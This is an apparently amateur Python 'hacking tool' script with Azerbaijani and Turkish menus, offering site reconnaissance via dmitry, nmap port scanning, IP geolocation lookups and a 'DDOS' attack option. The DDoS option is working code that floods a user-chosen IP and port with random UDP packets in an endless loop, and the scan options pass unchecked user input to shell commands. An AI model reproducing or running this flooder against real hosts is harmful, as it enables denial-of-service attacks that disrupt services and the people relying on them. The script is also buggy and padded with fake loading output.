import time
import os
os.system("clear")
print("""\033[31m\


 ▄▄▄▄    ██▓     ▒█████   ▒█████  ▓█████▄ ▓█████  ██▀███  
▓█████▄ ▓██▒    ▒██▒  ██▒▒██▒  ██▒▒██▀ ██▌▓█   ▀ ▓██ ▒ ██▒
▒██▒ ▄██▒██░    ▒██░  ██▒▒██░  ██▒░██   █▌▒███   ▓██ ░▄█ ▒
▒██░█▀  ▒██░    ▒██   ██░▒██   ██░░▓█▄   ▌▒▓█  ▄ ▒██▀▀█▄  
░▓█  ▀█▓░██████▒░ ████▓▒░░ ████▓▒░░▒████▓ ░▒████▒░██▓ ▒██▒
░▒▓███▀▒░ ▒░▓  ░░ ▒░▒░▒░ ░ ▒░▒░▒░  ▒▒▓  ▒ ░░ ▒░ ░░ ▒▓ ░▒▓░
▒░▒   ░ ░ ░ ▒  ░  ░ ▒ ▒░   ░ ▒ ▒░  ░ ▒  ▒  ░ ░  ░  ░▒ ░ ▒░
 ░    ░   ░ ░   ░ ░ ░ ▒  ░ ░ ░ ▒   ░ ░  ░    ░     ░░   ░ 
 ░          ░  ░    ░ ░      ░ ░     ░       ░  ░   ░     
      ░                            ░                     
""")
time.sleep(0.5)
print("""\033[31m\ 
      DİL SEÇ \ CHOOSE LANGUAGE

+++++++++++++++++++++++++
+  AZ. DİLİ ÜÇÜN ---1   +
+  US. FOR ENG ---2     +
+  TR. DİLİ İÇİN ---3   +
+++++++++++++++++++++++++
""")
dil = input("Yaz\Write: ")
if(dil == "1"):
 import json
 from urllib.request import urlopen
 import os
 import socket
 import random
 import time
 import subprocess
 import signal
 os.system("clear")

 print("""\033[31m\

 
  ▄▄▄▄    ██▓     ▒█████   ▒█████  ▓█████▄ ▓█████  ██▀███  
 ▓█████▄ ▓██▒    ▒██▒  ██▒▒██▒  ██▒▒██▀ ██▌▓█   ▀ ▓██ ▒ ██▒
 ▒██▒ ▄██▒██░    ▒██░  ██▒▒██░  ██▒░██   █▌▒███   ▓██ ░▄█ ▒
 ▒██░█▀  ▒██░    ▒██   ██░▒██   ██░░▓█▄   ▌▒▓█  ▄ ▒██▀▀█▄  
 ░▓█  ▀█▓░██████▒░ ████▓▒░░ ████▓▒░░▒████▓ ░▒████▒░██▓ ▒██▒
 ░▒▓███▀▒░ ▒░▓  ░░ ▒░▒░▒░ ░ ▒░▒░▒░  ▒▒▓  ▒ ░░ ▒░ ░░ ▒▓ ░▒▓░
 ▒░▒   ░ ░ ░ ▒  ░  ░ ▒ ▒░   ░ ▒ ▒░  ░ ▒  ▒  ░ ░  ░  ░▒ ░ ▒░
  ░    ░   ░ ░   ░ ░ ░ ▒  ░ ░ ░ ▒   ░ ░  ░    ░     ░░   ░ 
  ░          ░  ░    ░ ░      ░ ░     ░       ░  ░   ░     
      ░                            ░                     
 """)
 time.sleep(5)
 os.system("clear")

 print("""\033[31mBOOT: v1.0.9\033[0m""")
 print("""\033[94m
 ##############################################################                                                    
 # LİNUX?yoxsaTERMUX?---hansından bağlanırsınız?              #
 # 1---linux                                                  #
 # 2---termux(Yükləmələr var və uzun çəkə bilər,normaldır.    #
 # 3---əgər ilk dəfə girmirsinizsə 3 vəya başqa birşey yazın. #                               
 # 4---Google shell ve ya server cihazi üçün 4 yazın.         #
 #                                                            #
 #BİLƏRƏK YANLIŞ CAVAB VERSƏNİZ SİSTEMİNİZDƏ XƏTA OLA BİLƏR!  #
 #YÜKLƏMƏ ZAMANI SUAL GƏLDİYİ SAMAN Y yada e YAZIN.           #
 ##############################################################
 #YENİ GÜNCƏLLƏMƏDƏN SONRA GOOGLE SHEELDƏ AUDİO OLMADIĞI      #
 #ÜÇÜN VERSİYA UYĞUN DEYİL. BOOTDAN DOĞRU SEÇİMİ EDİN.        #
 ##############################################################

 \033[0m""")
 print("""\033[31m GITHUB--- https://github.com/Red-BITH\033[0m""")
 r = input("daxil et:")
 if(r == "4"):
     import os
     os.system("clear")
     os.system("python FOR_GoogleShell.py")
 if(r == "1"):
     import sys
     os.system("pip install pygame")
     import pygame.mixer
     import time
     import os
     os.system("sudo apt install mpv")
     import pygame.mixer
     import time
     pygame.mixer.init()
     pygame.mixer.music.load("fnaf3.mp3")  

    
     import tkinter as tk
     from tkinter import ttk

     def animate_loading():
         progress["value"] += 1
         if progress["value"] >= 100:
             root.after(1000, root.destroy)  # 1 saniye sonra pencereyi kapat
         else:
             root.after(40, animate_loading)

     root = tk.Tk()
     root.title("Red_TOOL")

     frame = ttk.Frame(root)
     frame.pack(pady=50)

     loading_label = ttk.Label(frame, text="Bashladilir...", font=("Helvetica", 12))
     loading_label.grid(row=0, column=1, padx=10, pady=10)

     progress = ttk.Progressbar(frame, orient="horizontal", length=200, mode="determinate")
     progress.grid(row=1, column=1, padx=10, pady=10)

     root.geometry("500x300")
    
     root.attributes('-topmost', True)

# Animasyonu başlatmak için animate_loading işlevini çağırın
     animate_loading()
        

     pygame.mixer.music.play()
     root.mainloop()
    
   


     os.system("pip install requests")
     import requests
     os.system("pip3 install termcolor")
     os.system("pip3 install tabulate")
     os.system("apt install python3")
     os.system("apt install dmitry")
     os.system("apt install nmap")
     os.system("python -m pip install --upgrade pip")
     os.system("python -m pip install --upgrade termcolor")
     from tabulate import tabulate
     from termcolor import colored
     time.sleep(1)
     print("\033[91mYüklənir....\033[91m")
     print("\033[91m29%\033[91m")
     time.sleep(1)
     print("\033[91m57%\033[91m")
     print("\033[93mERR: Data.Config: \033[93m" + "\033[91mSTR\033[91m")
     time.sleep(1)
     print("\033[95mPaketler çıxardılır:\033[95m")
     time.sleep(5)
     print("\033[93mGit-ignore müraciət edilir:\033[0m")
     time.sleep(5)
     print("\033[91m89% \033[91m")
     print("\033[93mGit-ignore işə salınır:\033[0m")
     print("\033[92m100%\033[92m")
     time.sleep(3)
     os.system("clear")
   
 elif(r == "2"):
     os.system("pkg update")
     os.system("apt-get update&&upgrade")
     os.system("pkg install openssl")
     os.system("pip install termcolor")
     os.system("pip install requests")
    
     os.system("pip install requests")
     import requests
    
     os.system("pip3 installl termcolor")
     os.system("pip install tabulate")
     os.system("apt install python3")
     os.system("apt install dmitry")
     os.system("apt install nmap")
     os.system("python -m pip install --upgrade pip")
     os.system("python -m pip install --upgrade termcolor")
     from tabulate import tabulate
     from termcolor import colored
     time.sleep(1)
     print("\033[91mYüklənir....\033[91m")
     print("\033[91m29%\033[91m")
     time.sleep(1)
     print("\033[91m57%\033[91m")
     print("\033[93mERR: Data.Config: \033[93m" + "\033[91mSTR\033[91m")
     time.sleep(1)
     print("\033[95mPaketler çıxardılır:\033[95m")
     time.sleep(5)
     print("\033[93mGit-ignore müraciət edilir:\033[0m")
     time.sleep(5)
     print("\033[91m89% \033[91m")
     print("\033[93mGit-ignore işə salınır:\033[0m")
     print("\033[92m100%\033[92m")
     time.sleep(3)
     os.system("clear")
 elif(r == 3):
     import os
     time.sleep(1)
     print("\033[91mYüklənir....\033[91m")
     print("\033[91m29%\033[91m")
     time.sleep(1)
     print("\033[91m57%\033[91m")
     print("\033[93mERR: Data.Config: \033[93m" + "\033[91mSTR\033[91m")
     time.sleep(1)
     print("\033[95mPaketler çıxardılır:\033[95m")
     time.sleep(5)
     print("\033[93mGit-ignore müraciət edilir:\033[0m")
     time.sleep(5)
     print("\033[91m89% \033[91m")
     print("\033[93mGit-ignore işə salınır:\033[0m")
     print("\033[92m100%\033[92m")
     time.sleep(3)
     os.system("clear")
     os.system("clear")    
     os.system("clear")
     os.system("python uyarlama.py")
    
    
 class Colors:
     HEADER = '\033[95m'
     BLUE = '\033[94m'
     GREEN = '\033[92m'
     YELLOW = '\033[93m'
     RED = '\033[91m'
     ENDC = '\033[0m'


 def print_colored(text, color):
     print(color + text + Colors.ENDC)


 def durdur(signal, frame):
     print_colored("Program söndürülür...", Colors.YELLOW)
     os._exit(0)



 signal.signal(signal.SIGINT, durdur)


 metin = ('''\033[91m
  /$$$$$$$        /$$$$$$$$       /$$$$$$$ 
 | $$__  $$      | $$_____/      | $$__  $$
 | $$  \ $$      | $$            | $$  \ $$
 | $$$$$$$/      | $$$$$         | $$  | $$
 | $$__  $$      | $$__/         | $$  | $$
 | $$  \ $$      | $$            | $$  | $$
 | $$  | $$      | $$$$$$$$      | $$$$$$$/
 |__/  |__/      |________/      |_______/ 
                                          
                                          
 \033[0m''') + ('''\033[92m
 
  /$$$$$$$$        /$$$$$$         /$$$$$$        /$$            
 |__  $$__/       /$$__  $$       /$$__  $$      | $$            
    | $$         | $$  \ $$      | $$  \ $$      | $$            
    | $$         | $$  | $$      | $$  | $$      | $$            
    | $$         | $$  | $$      | $$  | $$      | $$            
    | $$         | $$  | $$      | $$  | $$      | $$            
    | $$         |  $$$$$$/      |  $$$$$$/      | $$$$$$$$      
    |__/          \______/        \______/       |________/  
 \033[92m''')
 print(metin)
 pygame.mixer.music.play()

 print_colored("|XOS GELMİSİNİZ|", Colors.BLUE)
 print_colored("|RED BITH TOOL|", Colors.RED)
 print_colored("| BY RED_BITH  |", Colors.GREEN)

 print_colored("""1.Hedef site haqqinda(Termuxda işləməyə bilər.)
 2.port scanner
 3.DDOS hucum
 4.Ip addres Melumat
 5.Hedef site banner decode(demo)
 """, Colors.YELLOW)

 secim = input("Nov sec:")

 if secim == '1':
     hedefsite = input('Hedef site adresi: ')
     os.system('dmitry ' + hedefsite)

 elif secim == '2':
     hedef = input('Sayt adresi ve ya ip daxit et: ')
     os.system('nmap ' + hedef)

 elif secim == '3':
     print_colored("""
     ###########################
     #  T00L - By RED_BITH     #
     #  ATTACK- DDOS           #
     #  HUCUMA HAZIRDIR        #
     ###########################
     """, Colors.RED)
    
     hedef_ip = input("Hedef ip daxil et:")
     hedef_port = int(input("Hedef port:"))

     bytes = random._urandom(3000)
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     sayac = 0
     while True:
         sock.sendto(bytes, (hedef_ip, hedef_port))
         sayac += 1
         print("\033[92mHUCUM EDILIR , gonderilen byte:::%s\033[0m" % (sayac))

 elif secim == '4':
     print_colored("""
     ###############################
     #  ATTACK- Ip melumat         #
     #   BY RED-BITH               #
     # ASAGIDAKI QAYDALARA EMEL ET #
     ###############################
     """, Colors.GREEN)
    
     print_colored("OZ ip niz haqqinda ? yaxud qarsi teref? ", Colors.BLUE)
     secim3 = input("SECIMINI ET--1-Oz ip; 2-qarsi ip::: ")
    
     if secim3 == '1':
         def get_own_ip_info():
             url = "https://ipinfo.io/json"
             response = requests.get(url)
             data = response.json()
             return data

         own_ip_info = get_own_ip_info()
         print_colored(json.dumps(own_ip_info, indent=4), Colors.YELLOW)

     elif secim3 == '2':
         rabite = input("İP daxil et")
         url = "https://ipinfo.io/" + rabite
         response = urlopen(url)
         data = json.load(response)

         table_data = [
             ["IP", data["ip"]],
             ["city", data["city"]],
             ["Region", data["region"]],
             ["Country", data["country"]],
             ["Postal Code", data["postal"]],
             ["Organization", data["org"]],
             ["ASN", data.get("asn", ["N/A"])[0]],
             ["IP Range", data.get("ip_range", "N/A")],
             ["Local Time", data.get("timezone", "N/A")],
             ["Timezone", data.get("timezone", "N/A")],
             ["Coordinates", data.get("loc", "N/A")],
             ["Privacy Detection", data.get("privacy", "N/A")]
         ]

         table = tabulate(table_data, headers=["Field", "Value"], tablefmt="grid")
         print_colored(table, Colors.BLUE)

 elif(secim == "5"):
     print("""Hazırdır.Davam edilsin?
     bəli -- 1
     xeyr -- 2""")
     y = input("Daxil et:")
     if(y == "1"):
         os.system("python3 str.py")
        
                
                
    
    

else:
    print_colored("----Xəta baş verdi!", Colors.RED)
    print_colored("""----Yenidən başlatma üçün : 1.
    ----Çıxış etmək üçün :2.""", Colors.YELLOW)
    secim2 = input("Qərar ver:")
    
    if secim2 == '1':
        os.system("python RED_TOOL.py")
    elif secim2 == '2':
        print("ok")
    else:
        print("request= OK!")
        time.sleep(1)


    
    
